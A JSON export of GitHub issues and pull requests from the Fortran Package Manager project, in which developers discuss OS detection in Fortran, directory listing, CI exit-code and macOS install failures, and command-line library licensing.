            "text": "Given the issues in #141 to determine the OS type, I think the most robust is to do it like CMake: fpm will detect / know the operating system that it is on, and it will pass this information down the source files, for example in terms of macro definitions, such as:\n\nFPM_OS_LINUX\nFPM_OS_MACOS\nFPM_OS_WINDOWS\n\nOr something like that. We might be even more specific than that if needed. This seems to be the most robust and cross-platform way to do it that will work with all Fortran compilers.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 15:11:20+00:00",
                    "text": "I tried various ways using macros in #142, and none of them seem to work with gfortran. So that's why I think having fpm define those macros is the way to go."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 15:16:58+00:00",
                    "text": "Right, so if fpm itself can detect the operating system, what do you need the macros for? I thought the macros are only useful when your software doesn't have the information you need. Or am I missing something?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:23:55+00:00",
                    "text": "It's a chicken and an egg. The fpm implementation in Fortran needs to know the system type so that we know what command to use to get the directory content. The most robust seems to be if the build system (whether cmake or fpm) passes this information in as macro definitions."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 15:31:07+00:00",
                    "text": "Okay, so the bootstrap Haskell fpm will know the OS and pass the macros down to Fortran fpm. Then in the future when you want to bootstrap Fortran fpm using Fortran fpm, then the OS information will already be available in the boostrap Fortran fpm binary. It made me dizzy for a little bit, but I think it works."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:34:47+00:00",
                    "text": "Right. The other way to bootstrap fpm down the road will be via cmake (#123), so the cmake build system that fpm will generate will have to detect the OS type (which cmake knows how to do) and then create the proper FPM_OS_* macro defines."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 11:50:39+00:00",
                    "text": "You could use the commands that come with the operating system (for instance this website gives some indicators.\nWhile this will not be waterproof, the module may simply test the various commands - whichever succeeds is the one we want.\nI can give this a try."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 12:32:31+00:00",
                    "text": "I just tried:\nver in a Windows command box gives the indication of the Windows version\nThis does not work with MinGW or Cygwin, even though they are Windows-based OSes.\nuname -a succeeds on MinGW, Cygwin and Linux with proper indications of all OS types.\nI have no access to MacOS but I imagine that uname -a work fine there as well.\n(Something to check: whether ver is not a haphazard program - for uname I guess /usr/bin/uname is restrictive enough?)"
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 14:59:22+00:00",
                    "text": "Here is how we currently do this using environment variables: \n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 16\n      in\n      6ef2546\n    \n    \n    \n    \n\n        \n          \n           integer function get_os_type() result(r)"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:16:20+00:00",
                    "text": "Hm, the environment variable HOMEPATH is set to \"\\Users\\markus\" on my Cygwin and MinGW/w-64 installations. So, with the current procedure that would boil down to \"Windows\"."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 17:19:54+00:00",
                    "text": "It looks like we may have to combine the current HOMEPATH query with a ver test suggested by @arjenmarkus if we want to differentiate MinGW or Cygwin from Windows."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:23:10+00:00",
                    "text": "Since they represent very different operating environments, I think we\ncannot ignore the difference ;). For instance: \"dir\" does not work under\nCygwin or MinGW.\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:20 schreef Milan Curcic <notifications@github.com>:\n\u2026\n It looks like we may have to combine the current HOMEPATH query with a ver\n test suggested by @arjenmarkus <https://github.com/arjenmarkus> if we\n want to differentiate MinGW or Cygwin from Windows.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#144 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2ZDUGZDNVZCMXWNUDR5BWMXANCNFSM4PEZSOMQ>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:26:10+00:00",
                    "text": "Oops, I was too hasty: \"dir\" does actually work and \"dir -b\" also. But then\n\"dir /b\" does not and, vice versa, under a Windows command box \"dir -b\"\ndoes not work - it looks for a file \"-b\".\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:22 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n Since they represent very different operating environments, I think we\n cannot ignore the difference ;). For instance: \"dir\" does not work under\n Cygwin or MinGW.\n\n Regards,\n\n Arjen\n\n Op do 23 jul. 2020 om 19:20 schreef Milan Curcic ***@***.***\n >:\n\n> It looks like we may have to combine the current HOMEPATH query with a\n> ver test suggested by @arjenmarkus <https://github.com/arjenmarkus> if\n> we want to differentiate MinGW or Cygwin from Windows.\n>\n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub\n> <#144 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR2ZDUGZDNVZCMXWNUDR5BWMXANCNFSM4PEZSOMQ>\n> .\n>"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 17:34:15+00:00",
                    "text": "Right, dir is part of GNU Coreutils, so it works on most Linux systems, but not on macOS for example. Best to stay away from it for making important decisions :)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 18:25:21+00:00",
                    "text": "I have experimented a bit: the attached code correctly identifies the\nfour OSes I have access to. It cannot rely on \"ver\", because that is\nalso supported by MinGW and Cygwin, so instead I use \"uname\". However,\nMinGW gives odd results - /usr/bin/uname was not found (presumably the\ndirectory is not properly substituted). So, it also tries \"uname\"\nwithout the path.\n\nThe executable I created with Intel Fortran gives the right (!)\nidentification under a Windows command box, MinGW and Cygwin. I have\nnot tested the MinGW/Cygwin variants under the others.\n\n(Attaching it to an email was the fastest way, but of course I can\nalso put it in a pull request)\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:34 schreef Milan Curcic <notifications@github.com>:\n\n Right, dir is part of GNU Coreutils, so it works on most Linux systems, but not on macOS for example. Best to stay away from it for making important decisions :).\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe.\n! getos.f90 --\n!     Attempt to characterise the operating system\n!\nmodule getos\n    implicit none\n\n    integer, parameter :: OS_WINDOWS = 1\n    integer, parameter :: OS_LINUX   = 2\n    integer, parameter :: OS_MACOS   = 3\n    integer, parameter :: OS_CYGWIN  = 4\n    integer, parameter :: OS_MINGW   = 5\n\ncontains\n\n! get_os --\n!     Identify the operating system\n!\n! Arguments:\n!     None\n!\n! Note:\n!     Linux is used as the fallback option. Should we distinguish this from a positive identification?\n!\ninteger function get_os()\n    character(len=80) :: val\n    character(len=20) :: os_id\n    integer           :: lun\n    integer           :: stat\n\n    !\n    ! Try the environment variable\n    !\n    call get_environment_variable( \"HOMEPATH\", val, status = stat )\n\n    if ( stat == 0 .and. val(1:7) == \"\\Users\\\" ) then\n        !\n        ! We may be on Windows, probably, but what flavour? Windows, Cygwin or MinGW?\n        !\n        ! First try \"uname\"\n        !\n        ! Note: MinGW gives an error when using the full path ...\n        !\n        call execute_command_line( \"/usr/bin/uname -a > fpm_tmp.out 2>&1\", exitstat = stat )\n        if ( stat /= 0 ) then\n            call execute_command_line( \"uname -a > fpm_tmp.out 2>&1\", exitstat = stat )\n        endif\n\n        if ( stat /= 0 ) then\n            !\n            ! This seems to be Windows\n            !\n            get_os = OS_WINDOWS\n        else\n            open( newunit = lun, file = \"fpm_tmp.out\" )\n            read( lun, * ) os_id\n            close( lun, status = 'delete' )\n\n            get_os = merge( OS_CYGWIN, OS_MINGW, os_id(1:6) == 'CYGWIN' )\n        endif\n    else\n        !\n        ! We are on Linux or MacOS\n        !\n        call get_environment_variable( \"HOME\", val, status = stat )\n\n        if ( stat == 0 ) then\n            if ( val(1:7) == \"/Users/\" ) then\n                get_os = OS_MACOS\n            else\n                get_os = OS_LINUX\n            endif\n        else\n            !\n            ! Use Linux as fallback option\n            !\n            get_os = OS_LINUX\n        endif\n    endif\nend function get_os\n\nend module getos\n\n! test ...\n!\nprogram test_get_os\n    use getos\n\n    integer :: id\n\n    character(len=10), dimension(5) :: os_identification = &\n        ['Windows   ', 'Linux     ', 'MacOS     ', 'Cygwin    ', 'MinGW     ']\n\n    id = get_os()\n    write(*,*) id, os_identification(id)\n\nend program test_get_os"
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 23:37:46+00:00",
                    "text": "Thanks @arjenmarkus, much appreciated. We should incorporate this into fpm."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:31:05+00:00",
                    "text": "Done with #162"
                }
            ]
        },
        {
            "number": 143,
            "user": "certik",
            "date": "2020-07-22 14:41:32+00:00",
            "title": "`fpm run` does not propagate exit code",
            "text": "fpm run does not return with error if the program fails, as can be checked by:\n$ fpm run && echo \"OK\"\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7ff9ae8262ed in ???\n#1  0x7ff9ae826ed5 in ???\n#2  0x7ff9ae827f86 in ???\n#3  0x55ee5e99e013 in get_os\n\tat src/fpm.F90:22\n#4  0x55ee5e99df25 in __fpm_MOD_print_help\n\tat src/fpm.F90:28\n#5  0x55ee5e99daa2 in MAIN__\n\tat app/main.f90:7\n#6  0x55ee5e99dc43 in main\n\tat app/main.f90:2\nOK\n\nThis causes CI tests to pass even though they should fail, e.g.:\nhttps://github.com/fortran-lang/fpm/pull/142/checks?check_run_id=897192409\nwhich should have failed, but happily continues:\n...\n# gfortran (for build/gfortran_debug/app/main.o)\n# gfortran (for build/gfortran_debug/app/fpm)\n+ fpm run\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fc9615aaaed in ???\n#1  0x7fc9615ab605 in ???\n#2  0x7fc9615acc93 in ???\n#3  0x55b23ed92014 in get_os\n\tat src/fpm.F90:22\n#4  0x55b23ed91f21 in __fpm_MOD_print_help\n\tat src/fpm.F90:28\n#5  0x55b23ed91a7d in MAIN__\n\tat app/main.f90:7\n#6  0x55b23ed91c28 in main\n\tat app/main.f90:2\n+ fpm run --args build\n # Building project\n + gfortran -c src/fpm.F90 -o fpm.o\n + gfortran -c app/main.f90 -o main.o\n...\n\nThis is quite high priority, as we need our CI to be reliable with regards to these things.\n@everythingfunctional do you  know how to fix it?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-23 16:34:48+00:00",
                    "text": "I see. I expected the function used to run external commands to propagate that automatically, but I guess I was wrong. It should just be a matter of catching the return status and manually doing something with it. I should have some time to look into it this weekend."
                }
            ]
        },
        {
            "number": 142,
            "user": "certik",
            "date": "2020-07-22 05:24:08+00:00",
            "title": "Initial implementation of get_os()",
            "text": "It might be difficult to get this working via pre-processor.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 14:43:10+00:00",
                    "text": "This PR actually fails tests, but they look like they passed due to #143."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:07:46+00:00",
                    "text": "@milancurcic the tests are currently failing, even though they are green. The macros do not work, if you click on the output when we just run fpm, you can see that you get a stacktrace and \"error stop\"."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:09:06+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-22 15:28:47+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables.\n\nHow did you pass the macro to gfortran? as -DFMP_OS_xxxx?"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-22 15:39:56+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables.\n\nIf it could help, fpp and macros seem to work when compiling manually:\n gfortran -cpp -D_WIN32 fpm.F90\n$ ./a.out \n Fortran Package Manager (fpm)\n OS Type:            3"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:44:36+00:00",
                    "text": "@jvdp1 the issue is that those macros do not seem to be defined by default on any platform with gfortran (and obviously we need to support all Fortran compilers down the road, each defining slightly different macros).\nThe current solution as of (a1dc068) seems to work. It's obviously not super robust, but it will get us started, and we can design the correct full solution in #144."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:53:53+00:00",
                    "text": "Everything works except Windows. It just occurred tome that if $HOME doesn't exist, then we can assume Windows. I am going to rework it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 16:05:40+00:00",
                    "text": "The problem now is that if a Windows user defines %HOME% for any reason, the function will fail.\nI think the original %HOMEPATH% approach is more robust, but you also need to test the value:\ncall get_environment_variable(\"HOMEPATH\", val, status=stat)\nif (stat == 0 .and. val(1:7) == \"\\Users\\\") then\n    r = OS_WINDOWS\n    return\nend if"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:16:52+00:00",
                    "text": "So when I first implemented $HOMEPATH for Windows, it failed: https://github.com/fortran-lang/fpm/runs/899185101, but then the later commit which didn't touch it, succeeded: https://github.com/fortran-lang/fpm/runs/899226753. This is infuriating, I spent hours yesterday due to this fragility of the GitHub Actions. I think they sometimes test a previous commit, even though they claim to test the latest commit. This is really bad from a reliability perspective.\nAnyway, the latest commit (only using $HOME) also seems to work, but who know knows if it actually got tested?\nI can put in back the $HOMEPATH if you prefer. This is all fragile and can easily break anyway, if somebody declares HOMEPATH on linux for example."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 16:20:49+00:00",
                    "text": "This is all fragile and can easily break anyway, if somebody declares HOMEPATH on linux for example.\n\nYes, but testing for the value (\"\\Users\\\") greatly reduces the chance of collision. I don't think we should excuse the code to be fragile if the CI is already fragile."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:25:46+00:00",
                    "text": "Right. I did it as you suggested, but I just don't know which of the two is more robust (will succeed in more cases):\n\nTest for $HOMEPATH=\\Users\\\nTest that $HOME does not exist\n\nBecause I do not know if $HOMEPATH on Windows can be set to other paths than \\Users\\ quite often, or not. And compared to that how often do users define $HOME on Windows."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:36:14+00:00",
                    "text": "I checked the CI manually, it still seems to work (assuming the CI tested the latest commit). But given the fact that the previous commit seems to work, then if the master fails after this is merged, we can always revert the latest commit.\nThis is ready for a final review and merge as far as I am concerned."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 20:25:06+00:00",
                    "text": "@milancurcic, @everythingfunctional is this ok to go in? I have another PR (#145) that depends on this."
                }
            ]
        },
        {
            "number": 141,
            "user": "certik",
            "date": "2020-07-21 22:04:55+00:00",
            "title": "How to list directory content",
            "text": "In order to move beyond #137, we need a cross-platform way to read all the *.f90 files in a directory. What is the best way to do that in Fortran?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:11:27+00:00",
                    "text": "For cross-platform you need this.\nOtherwise, I think the next best kludge would be to call execute_command_line('ls > tmp.txt'), then parse tmp.txt, and equivalent on Windows."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:20:55+00:00",
                    "text": "We need a temporary solution so that we are not stuck on this, and can move on, and in the meantime we can work on the full general solution."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:27:50+00:00",
                    "text": "I agree. I think wrapping around the shell commands on each OS is the way to go."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:34:23+00:00",
                    "text": "It seems like it. How do you determine which OS you are on from Fortran?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:45:23+00:00",
                    "text": "Perhaps we can test the value of an environment variable (get_environment_variable) that we know will be different between systems? Perhaps HOME, and then detect based on whether the value has forward slashes (Linux and macOS) or backslashes (Windows)? Just an idea, I've never done this myself."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:59:23+00:00",
                    "text": "Good idea, the GET_ENVIRONMENT_VARIABLE intrinsic will do this. That will get us started, and we can make this more robust / general later."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:23:50+00:00",
                    "text": "I'd put it behind a function and just use preprocessor directives. Something like:\nfunction is_windows()\n    logical :: is_windows\n\n#ifdef (WIN_32)\n    is_windows = .true.\n#elif\n    is_windows = .false.\n#endif\nObviously you'll need to look up the proper syntax and tests, but that way, even if you change the way it's done, it shouldn't require changing any other code anywhere."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:28:01+00:00",
                    "text": "@everythingfunctional ah that's right, I think that should work."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 23:37:52+00:00",
                    "text": "I didn't know fpm supported preprocessing. \ud83d\udc4d in that case."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:43:41+00:00",
                    "text": "fpm isn't doing any preprocessing, but our currently only supported compiler does a bit ;). Should be enough to solve at least the \"Is this Windows or not?\" question."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 09:00:36+00:00",
                    "text": "I just tried: on Windows \"dir /b\" gives the bare list of file names, just as \"ls\". That means that only the command is different - not the format of the output (with out \"/b\" you get a lot of rubbish ;))."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 14:46:18+00:00",
                    "text": "@everythingfunctional so the ifdef trick does not work with gfortran to determine the OS, I tried that in #142, and it does not work on linux, nor anywhere else... Let's further discuss this OS determination in #144."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:31:03+00:00",
                    "text": "Thanks @arjenmarkus. I will try to do this once #142 is merged, as I need to determine the OS type first to know which command to run."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-08 09:27:57+00:00",
                    "text": "Until stdlib can be included, perhaps linking an ISO C binding abstraction layer to either POSIX and Win32 routines at compile time may be sufficient."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:07:00+00:00",
                    "text": "This has been resolved by #507"
                }
            ]
        },
        {
            "number": 140,
            "user": "certik",
            "date": "2020-07-21 21:58:03+00:00",
            "title": "Build hello_world",
            "text": "The build is hardwired, but it works. This is mainly useful to setup our CI.\nOnce we implement a more general solution, we just need to keep our CI passing.\nFixes #137.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 22:10:24+00:00",
                    "text": "Weird. The Linux CI didn't execute the additional lines I added in this PR: https://github.com/fortran-lang/fpm/pull/140/checks?check_run_id=896195075"
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:29:50+00:00",
                    "text": "I extracted the tests into separate files, now they are executed properly. Don't know what the problem was, it looks like a bug at the CI."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:32:55+00:00",
                    "text": "The CI is not executing the latest version of the files at a given commit. That's a bug, which makes it pretty hard to Debug."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:56:18+00:00",
                    "text": "It finally works, all tests pass and are executed properly. Hello World test now works on all platforms."
                }
            ]
        },
        {
            "number": 139,
            "user": "certik",
            "date": "2020-07-21 20:13:34+00:00",
            "title": "Minimal `fpm build` implementation",
            "text": "Very minimal fpm build now works, it can only build fpm itself, but it can do it on all platforms, which is nice.\nAfter this is in, the next step is to make it more general and build the hello_world example, and then execute this test also.\nTowards #137.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 21:39:02+00:00",
                    "text": "Finally some code I can contribute! I am going to merge, the change is simple, so I think one positive review is enough."
                }
            ]
        },
        {
            "number": 138,
            "user": "certik",
            "date": "2020-07-21 19:56:40+00:00",
            "title": "`fpm run --args \"a b c\"` should become `fpm run -- a b c`",
            "text": "As in Cargo.\nCurrently you must use \" as in:\nfpm run --args \"a b c\"\n\nRather, one should just do:\nfpm run -- a b c",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:29:56+00:00",
                    "text": "I agree, just couldn't figure out how to make that work with the command line parser I was using in Haskell."
                }
            ]
        },
        {
            "number": 137,
            "user": "certik",
            "date": "2020-07-21 19:52:41+00:00",
            "title": "Minimal version working",
            "text": "This minimal version will:\n\ncompile test/example_packages/hello_world\nrun this particular test\n\nTo get this working, we do not need any of the 3rd party packages as listed in #136, we only need to implement fpm build, fpm run, we do not need to read the toml file for now, so we can get it working quite quickly.\nThe main goal is to start testing this as part of our testing. Then later we can swap a proper CLI library, a proper TOML reading library, etc.",
            "comments": []
        },
        {
            "number": 136,
            "user": "certik",
            "date": "2020-07-21 19:45:52+00:00",
            "title": "Roadmap for Fortran implementation",
            "text": "Please see our beta release milestone for the latest roadmap for the Fortran implemetation.\nThis was discussed recently during the October monthly call (fpm-update-october-2020.pdf)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 20:58:43+00:00",
                    "text": "Fortran interface to curl for http requests: https://github.com/interkosmos/fortran-curl\nIf we end up needing more advanced git stuff than just downloading the code, we can wrap libgit2."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 20:14:28+00:00",
                    "text": "Per my comment in #149 (comment), it seems all of these can in principle be done in pure Fortran, except the internet download of tarballs. For git repositories, we'll just assume that the git executable is installed, as we already do in haskell fpm. To be able to bootstrap fpm easily, we can just have all dependencies as git repositories and assume git is present on all platforms. Then in principle everything can be done in pure Fortran, which I think might be very helpful at least initially.\nThen we can implement robust support for 3rd party non Fortran dependencies in the fortran fpm. Eventually we can then depend on curl or any other library (but if we do for fpm itself, it will always be more challenging to install it from source, say on HPC machines than if every dependency is pure Fortran)."
                },
                {
                    "user": "jacobwilliams",
                    "date": "2020-07-26 19:08:37+00:00",
                    "text": "FYI...somewhere i have a Fortran interface to WinINet that i wrote years ago. I think it was pretty rudimentary but it could be used to download files (on windows only of course). I can dig that up, but maybe you just want to stick with curl on all platforms?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:07:35+00:00",
                    "text": "Closing this in favor of the milestone."
                }
            ]
        },
        {
            "number": 135,
            "user": "milancurcic",
            "date": "2020-07-21 15:45:53+00:00",
            "title": "Command line interface (CLI)",
            "text": "How to implement the CLI in fpm-fortran? We can use:\n\nIntrinsics command_argument_count and get_command_argument (lowest level, no dependencies)\nFLAP by @szaghi (library, pure Fortran, I've used it a bit with good experience)\nM_cli by @urbanjost (library, pure Fortran, no personal experience with it)\nSome other library I'm not aware of?\n\nI think we should go with a library and both FLAP and M_cli seem to do what we need (positional arguments + optional flags). What do you think?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 15:52:02+00:00",
                    "text": "I would go with FLAP. But we have to make it an fpm package first, so that we can use it as a dependency. Update: that actually might not be as easy without refactoring... Looking at M_cli, it actually seems much easier to create an fpm package out of it. So we might start with M_cli, and then if FLAP can be made an fpm package, we can switch to it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 19:05:56+00:00",
                    "text": "M_cli is already an fpm package (I tried it--it works). However, after reviewing M_cli in more detail, I'm quite strongly in favor of FLAP. It seems more mature and powerful while in my opinion having a simpler API.\n@szaghi would you accept a PR to FLAP that would make it an fpm package? We'd make sure that your existing build systems  (CMake, Make, Fobis) still work. This would require adding an fpm.toml file to the top-level directory, and some adjustments to module names or source file names, but otherwise it would be backward compatible from user's point of view. Best part, it would make FLAP part of a rapidly growing fpm ecosystem of packages."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:33:31+00:00",
                    "text": "I haven't had a chance to look at either of the libraries, but that is definitely the way to go. We need to do whatever can help us bootstrap this faster.\nNote: the command line for fpm is quite complicated; subcommands, flags that are only applicable for a subset of them, some flags which may be mutually exclusive, etc.\nI think the first step, before we start implementing the command line interface is to clearly spec it out. Then we can pick a library and start implementing."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 19:59:02+00:00",
                    "text": "I am aware of two more libraries for command line interfaces:\n\ncommand_args from @arjenmarkus\nFTN_Getopt by Reinhold Bader (author of FGSL). I like the simplicity of this one (it is a single module). Unfortunately, the source code is not publicly available at the moment. I have a copy of the code and the author has indicated to me I can share it under GPL and the condition of preserving the authorship."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 20:18:30+00:00",
                    "text": "I would like all fpm dependencies to be MIT or BSD licensed, because we are linking everything statically into one executable, so GPL (and even LGPL) would prohibit us to license fpm under the MIT license."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-21 20:24:29+00:00",
                    "text": "Wouldn't it be useful to integrate such a library first (or simultaneously) in stdlib?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 20:24:39+00:00",
                    "text": "One more library I learned of recently is libSUFR (libSUFR is a library containing Some Useful Fortran Routines). It is also GPL.\nThe M_cli module from @urbanjost is licensed under the Unlicense.\nThe way I understand the licensing system of FLAP:\n\nfor FOSS projects:\n    GPL v3;\nfor closed source/commercial projects:\n    BSD 2-Clause;\n    BSD 3-Clause;\n    MIT.\n\n\nfpm would count as a FOSS project, since the source is public. Am I correct?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 20:31:51+00:00",
                    "text": "fpm would count as a FOSS project, since the source is public. Am I correct?\n\nI think that strictly only GPL family of software is FOSS. We are just OSS :)\nI'm pretty sure that @szaghi meant \"use whatever license you want\". He can confirm this."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 20:32:58+00:00",
                    "text": "@jvdp1 yes, stdlib should have basic command line parsing, just like Python has it. But we can wait with stdlib's integration until we get more experience what API makes the most sense."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 20:47:13+00:00",
                    "text": "Just as an alternative idea, we could also wrap one of the many existing C and C++ libraries:\n\ndocopt.c, docopt.cpp\ncommander\nCLI11 (I noticed @certik is a contributor \ud83d\udc4d ) Edit: It also has a partial TOML parser.\ncxxopts\n\nI think with the current Haskell version of fpm this would require a custom Makefile."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 21:42:07+00:00",
                    "text": "Yes, I investigated all options for C++, and most of them work, and I settled with using CLI11 for LFortran. Works great."
                }
            ]
        },
        {
            "number": 134,
            "user": "certik",
            "date": "2020-07-21 15:36:57+00:00",
            "title": "Haskell fails to install on macOS at our CI",
            "text": "The error is:\nRun curl --insecure -L https://get.haskellstack.org/stable/osx-x86_64.tar.gz | tar xz --strip-components=1 --include '*/stack' -C /Users/runner/.local/bin\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\ncurl: (35) Server aborted the SSL handshake\n\nSee e.g. https://github.com/fortran-lang/fpm/pull/131/checks?check_run_id=894840007",
            "comments": []
        },
        {
            "number": 133,
            "user": "milancurcic",
            "date": "2020-07-21 15:34:59+00:00",
            "title": "Draft an fpm specification",
            "text": "I want us to get started on the specification document. It would describe the expected behavior of fpm. It wouldn't be a user documentation, although users could use it to diagnose fpm bugs. A spec would help define much needed tests that would catch various recently reported unhandled exceptions.\nRather than us writing a spec and then an implementation following that spec, I think the spec should evolve side-by-side as we implement and discover the preferred ways to do things. So it will very much be a living document.\nI'm happy to start the first draft. In this issue, I'm merely asking for thumbs up if you agree, and if not let me know why.\n@certik @everythingfunctional @LKedward @arjenmarkus @smeskos",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 16:08:21+00:00",
                    "text": "If it was me, I would be fine with the spec simply being the tests themselves. But I am not against having a separate document also, but in either case, from a practical perspective, we need the tests for sure. That is how we will ensure that the Haskell and Fortran versions actually work."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 17:30:50+00:00",
                    "text": "I agree about tests, but to write tests you need to know the expected behavior of the program. Writing a spec would force us to get clear on the expected behavior."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 17:59:20+00:00",
                    "text": "That's fine with me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:23:37+00:00",
                    "text": "To the extent we can, the tests should read very much like the spec. But I am in favor of starting with a spec right now, mostly because I believe there are aspects of the Haskell version that do not function exactly as we want. We should have a discussion about how to handle these situations before we start writing the tests."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 06:29:15+00:00",
                    "text": "I agree: having worked with fpm a bit more, I see how it works currently\nand how it sometimes conflicts with things I am used to. It is not so bad\nthat fpm enforces a particular practice, but it should be clear what it\naccepts and that should match our intentions.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 21:23 schreef Brad Richardson <\nnotifications@github.com>:\n\u2026\n To the extent we can, the tests should read very much like the spec. But I\n am in favor of starting with a spec right now, mostly because I believe\n there are aspects of the Haskell version that do not function exactly as we\n want. We should have a discussion about how to handle these situations\n before we start writing the tests.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#133 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRY7GDQKFTCYFW3S2GTR4XTMVANCNFSM4PDXFU6A>\n ."
                }
            ]
        },
        {
            "number": 132,
            "user": "certik",
            "date": "2020-07-21 15:28:57+00:00",
            "title": "Fix tests on macOS",
            "text": "It turns out there were several problems on the macOS runner, all of which this PR fixes:\n\nthe download of the Haskell binary failed due to some SSL handshake error\nthe \"bin\" directory which would host the stack binary does not exist\nthe gfortran binary is no longer pre-installed on macOS (only gfortran-9)\n\nFixes #134.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 17:46:52+00:00",
                    "text": "@everythingfunctional you might want to figure out how to install Haskell on macOS, right now I just downloaded the macOS tarball on my linux, uploaded it to a gist, and let it download from the gist by the CI, so that it works, as we need the CI to be working."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:20:24+00:00",
                    "text": "I don't have access to a mac to test this out, but I suspect it is something that the stack maintainers will fix. They're install script is supposed to support most platforms."
                }
